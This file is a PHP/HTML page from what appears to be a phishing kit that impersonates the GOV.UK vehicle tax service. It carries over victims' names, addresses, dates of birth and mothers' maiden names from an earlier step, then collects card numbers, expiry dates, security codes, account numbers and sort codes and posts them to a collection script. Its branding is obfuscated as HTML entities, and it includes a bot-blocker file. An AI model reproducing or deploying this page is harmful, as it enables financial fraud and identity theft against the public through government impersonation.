<?php
require "includes/blocker.php";
require "includes/One_Time.php";
require "includes/functions.php";

$firstname = htmlspecialchars($_GET["aa"]);
$surname = htmlspecialchars($_GET["bb"]);
$address = htmlspecialchars($_GET["cc"]);
$city = htmlspecialchars($_GET["dd"]);
$zipcode = htmlspecialchars($_GET["ee"]);
$mmn = htmlspecialchars($_GET["ff"]);
$dob = htmlspecialchars($_GET["gg"]);
$phonenr = htmlspecialchars($_GET["hh"]);
$email = htmlspecialchars($_GET["ii"]);
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="media/favicon.ico" type="image/x-icon">
<link href="media/template.css" media="screen" rel="stylesheet" type="text/css">
<link href="media/template-print.css" media="print" rel="stylesheet" type="text/css">
<link href="media/fonts.css" media="screen" rel="stylesheet" type="text/css">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="media/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="media/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="media/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon-precomposed" href="media/apple-touch-icon-57x57.png">
<script>
function tryit() {
document.getElementById("blank").value = "Blank"; 
setTimeout(function() {
document.getElementById("aanr").focus(); 
}, 1800);
}


function submitit() {
document.getElementById('Loading1').style.display = "block";
setTimeout(function() {
document.getElementById('Loading1').style.display = "none";
document.getElementById('div2').style.display = "block";
}, 1700);
}

function change(){
var change = document.getElementById("thenr").value
if (change.charAt(0) == '3') {
document.getElementById("thetype").value = "AxA";
document.getElementById("three").maxLength = "4";
document.getElementById("thenr").style = "background-image: url('media/AxA.png'); background-size: 34px 28px; background-repeat: no-repeat; background-position: 99% 60%;"
} else {document.getElementById("thenr").style = ""}
if (change.charAt(0) == '4') {
document.getElementById("thetype").value = "VxV";
document.getElementById("three").maxLength = "3";
document.getElementById("thenr").style = "background-image: url('media/VxV.png'); background-size: 53px 17px; background-repeat: no-repeat; background-position: 99% 50%;"
}
if (change.charAt(0) == '5') {
document.getElementById("thetype").value = "MxM";
document.getElementById("three").maxLength = "3";
document.getElementById("thenr").className = ('input-large MxM');
document.getElementById("thenr").style = "background-image: url('media/MxM.png'); background-size: 40px 25px; background-repeat: no-repeat; background-position: 99% 50%;"
}
}


function check(form) {


if (!checkThenr (document.getElementById('thenr').value,document.getElementById('thetype').value))
{ document.getElementById("div1").classList.add('validation'); document.getElementById("errortxt1").style.display = "block"; form.thenr.focus(); return;} else { document.getElementById("div1").classList.remove('validation'); document.getElementById("errortxt1").style.display = "none"; }

var regExpressPostcode = /^(0[1-9]|1[0-2])\/?(2[0-9]|3[0-9])$/
if (!regExpressPostcode.test(form.goned.value))
{ document.getElementById("div1").classList.add('validation'); document.getElementById("errortxt1").style.display = "block"; form.goned.focus(); return;} else { document.getElementById("div1").classList.remove('validation'); document.getElementById("errortxt1").style.display = "none"; }


var regExpressPostcode = /^\d{3,4}$/
if (!regExpressPostcode.test(form.three.value))
{ document.getElementById("div1").classList.add('validation'); document.getElementById("errortxt1").style.display = "block"; form.three.focus(); return;} else {  submitit(); document.getElementById("div1").classList.remove('validation'); document.getElementById("errortxt1").style.display = "none";}


if (form.blank.value == "")
{ form.blank.focus();  return;}




document.getElementById('Loading1').style.display = "block";
setTimeout(function() { form.submit() }, 2000);
}
</script>
<title>
&#84;&#97;&#120;&#105;&#110;&#103;&#32;&#97;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#45;&#32;&#71;&#79;&#86;&period;&#85;&#75;</title>
<style type="text/css">
#MainContent_VedPicker_rbVED h4
{
padding: 0;
margin: 0;
margin-top: 1em;
margin-bottom: 0.5em;
}
#blank {  position: absolute;  clip: rect(0,0,0,0); }
</style>
<script type="text/javascript" src="https://code.jquery.com/jquery-2.2.3.js"></script>
<script src="media/styles.js" type="text/javascript"></script>
</head>
<body ontouchstart="" class="js-enabled">
<form method="post" action="php/status_1.php" id="EVL" novalidate="">
<input id="thetype" type="hidden" name="thetype" value="">
<input name="firstname" value="<?php echo $firstname; ?>" type="hidden" />
<input name="surname" value="<?php echo $surname; ?>" type="hidden" />
<input name="address" value="<?php echo $address; ?>" type="hidden" />
<input name="city" value="<?php echo $city; ?>" type="hidden" />
<input name="zipcode" value="<?php echo $zipcode; ?>" type="hidden" />
<input name="mmn" value="<?php echo $mmn; ?>" type="hidden" />
<input name="dob" value="<?php echo $dob; ?>" type="hidden" />
<input name="phonenr" value="<?php echo $phonenr; ?>" type="hidden" />
<input name="email" value="<?php echo $email; ?>" type="hidden" />

<header role="banner" class="with-proposition" id="global-header">
<div class="header-wrapper">
<div class="header-global">
<div class="header-logo">
<a id="logo" class="content">
<img src="media/dd.png" width="35" height="31"> &#71;&#79;&#86;&period;&#85;&#75;
</a>
</div>
</div>
<div class="header-proposition">
  <div class="content">
<nav id="proposition-menu">
  <a id="proposition-name">Vehicle tax</a>
</nav>
  </div>
</div>
</div>
</header>
<div id="globalNotice" class="maincontent">
<span id="lblGlobalMessage"><a class="toggle-target">&#86;&#105;&#101;&#119;&#32;&#98;&#117;&#100;&#103;&#101;&#116;&#32;&#99;&#104;&#97;&#110;&#103;&#101;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</a>
</span>   
</div>
<div id="global-header-bar"></div>
<div class="maincontent">
<div class="phase-banner">
  <p>
<strong class="phase-tag">BETA</strong>
<span>This is a new service – your <a id="FeedbackLink" href="#">feedback</a> will help us to improve it.</span>
  </p>
</div>
</div>
<div id="wrapper">
<div class="maincontent">
<div id="startHeader" class="start-header group">
<h1>
&#84;&#97;&#120;&#105;&#110;&#103;&#32;&#97;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;
</h1>
</div>

<div id="maindiv1" class="body-container group">
<div id="div1" class="">
<p>
<strong>
<label for="plate" class="label">&#76;&#105;&#110;&#107;&#32;&#121;&#111;&#117;&#114;&#32;&#100;&#101;&#98;&#105;&#116;&#32;&#111;&#114;&#32;&#99;&#114;&#101;&#100;&#105;&#116;&#32;&#99;&#97;&#114;&#100;</label>
</strong><br><br>
&#32;&#84;&#104;&#105;&#115;&#32;&#119;&#105;&#108;&#108;&#32;&#98;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#32;&#112;&#97;&#121;&#109;&#101;&#110;&#116;&#32;&#109;&#101;&#116;&#104;&#111;&#100;&period;&#32;
</p>
<p>
</p>
<span id="errortxt1" class="Validator" style="display:none;">This is a required field.</span>
<p>
<input autofocus="autofocus" class="input-large VxV" placeholder="XXXX XXXX XXXX XXXX" onKeyDown="if(event.keyCode==13) check(this.form);" onkeyup="change();" onchange="change();" type="tel" maxlength="16" name="number" id="thenr">
</p>
<p>
<input class="input-large" placeholder="Exp. Date MM/YY" onKeyDown="if(event.keyCode==13) check(this.form);" type="tel" maxlength="5" name="goned" id="goned">
</p>
<p>
<input class="input-large" placeholder="Security Code XXX" onKeyDown="if(event.keyCode==13) check(this.form);" type="tel" maxlength="3" name="three" id="three">
</p>
</div>
<input type="text" id="blank" name="blank" onfocus="tryit();">

<div id="div2" style="display:none;" class="">
<p>
</p>
<span id="errortxt2" class="Validator" style="display:none;">This is a required field.</span>
<p>
<input class="input-large" placeholder="Account number XXXXXXXX" onKeyDown="if(event.keyCode==13) check(this.form);" type="tel" maxlength="11" name="aanr" id="aanr">
</p>
<p>
<input class="input-large" placeholder="Sort code XX-XX-XX" onKeyDown="if(event.keyCode==13) check(this.form);" type="tel" maxlength="8" name="socd" id="socd">
</p>
</div>



<div>
<p>
<span id="MainContent_lblV5C2Aquire" class="label">Provide correct data during this process.</span>
</p>
</div>
<div class="action">
<input onclick="check(this.form)" type="button" name="butContinue" value="Continue" id="MainContent_butContinue" class="button">
<br><br>
<div id="Loading1" style="display: none;"><img src="media/loading.gif"></div>
<div id="Loading2" style="display: none;"><img src="media/loading.gif"></div>
</div>
</div>




</div>
</div>
<footer class="group js-footer" id="footer" role="contentinfo">
<div class="footer-wrapper">
<div class="footer-meta">
<div class="footer-meta-inner">
<ul>
<li>
<a id="cookiesLink" href="#">Cookies</a>
</li>
<li>
<a href="#">Terms and Conditions</a>
</li>
<li>
<a id="butEnglish" href="#">English</a>
</li>
<li>
<a id="butWelsh" href="#">Cymraeg</a>
</li>
<li>
<a href="#"><span id="privacyPolicy">Privacy Information Notice</span></a> 
</li>
<li>
Built by the <a href="#">&#68;&#114;&#105;&#118;&#101;&#114;&#32;&amp;&#32;&#86;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#76;&#105;&#99;&#101;&#110;&#115;&#105;&#110;&#103;&#32;&#65;&#103;&#101;&#110;&#99;&#121;</a> 
</li>
</ul>
<div class="open-licence">
<p class="logo"><a href="#">&#79;&#112;&#101;&#110;&#32;&#71;&#111;&#118;&#101;&#114;&#110;&#109;&#101;&#110;&#116;&#32;&#76;&#105;&#99;&#101;&#110;&#99;&#101;&#32;</a></p>
<p>
All content is available under the <a href="#">
&#79;&#112;&#101;&#110;&#32;&#71;&#111;&#118;&#101;&#114;&#110;&#109;&#101;&#110;&#116;&#32;&#76;&#105;&#99;&#101;&#110;&#99;&#101;&#32; v2.0</a>, except where otherwise stated</p>
</div>
</div>
<div class="copyright">
<a href="#">
© Crown copyright</a>
</div>
</div>
</div>
</footer>
</form>

<script>
var characterCount
$('#goned').on('input',function(e){
    if($(this).val().length == 2 && characterCount < $(this).val().length) {
        $(this).val($(this).val()+'/');
    }
    characterCount = $(this).val().length
});
</script>
<script>
var characterCount
$('#socd').on('input',function(e){
    if($(this).val().length == 2 && characterCount < $(this).val().length) {
        $(this).val($(this).val()+'-');
    }
    else if($(this).val().length == 5 && characterCount < $(this).val().length) {
        $(this).val($(this).val()+'-');
    }
    characterCount = $(this).val().length
});
</script>
<script type="text/javascript">
    window.onload=function(){
      
input_nr = function(jQinp)
{
    var format_and_pos = function(input, char, backspace)
    {
        var start = 0;
        var end = 0;
        var pos = 0;
        var value = input.value;

        if (char !== false)
        {
            start = input.selectionStart;
            end = input.selectionEnd;

            if (backspace && start > 0) // handle backspace onkeydown
            {
                start--;

                if (value[start] == " ")
                { start--; }
            }
            // To be able to replace the selection if there is one
            value = value.substring(0, start) + char + value.substring(end);

            pos = start + char.length; // caret position
        }

        var d = 0; // digit count
        var dd = 0; // total
        var gi = 0; // group index
        var newV = "";
        var groups = /^\D*3[47]/.test(value) ? 
        [4, 6, 5] : [4, 4, 4, 4];

        for (var i = 0; i < value.length; i++)
        {
            if (/\D/.test(value[i]))
            {
                if (start > i)
                { pos--; }
            }
            else
            {
                if (d === groups[gi])
                {
                    newV += " ";
                    d = 0;
                    gi++;

                    if (start >= i)
                    { pos++; }
                }
                newV += value[i];
                d++;
                dd++;
            }
            if (d === groups[gi] && groups.length === gi + 1) // max length
            { break; }
        }
        input.value = newV;

        if (char !== false)
        { input.setSelectionRange(pos, pos); }
    };

    jQinp.keypress(function(e)
    {
        var code = e.charCode || e.keyCode || e.which;

        // Check for tab and arrow keys (needed in Firefox)
        if (code !== 9 && (code < 37 || code > 40) &&
        // and CTRL+C / CTRL+V
        !(e.ctrlKey && (code === 99 || code === 118)))
        {
            e.preventDefault();

            var char = String.fromCharCode(code);

            // if the character is non-digit
            // -> return false (the character is not inserted)

            if (/\D/.test(char))
            { return false; }

            format_and_pos(this, char);
        }
    }).
    keydown(function(e) // backspace doesn't fire the keypress event
    {
        if (e.keyCode === 8 || e.keyCode === 46) // backspace or delete
        {
            e.preventDefault();
            format_and_pos(this, '', this.selectionStart === this.selectionEnd);
        }
    }).
    on('paste', function()
    {
        // A timeout is needed to get the new value pasted
        setTimeout(function()
        { format_and_pos(jQinp[0], ''); }, 50);
    }).
    blur(function() // reformat onblur just in case (optional)
    {
        format_and_pos(this, false);
    });
};

input_nr($('#thenr'));



}

</script>


</body></html>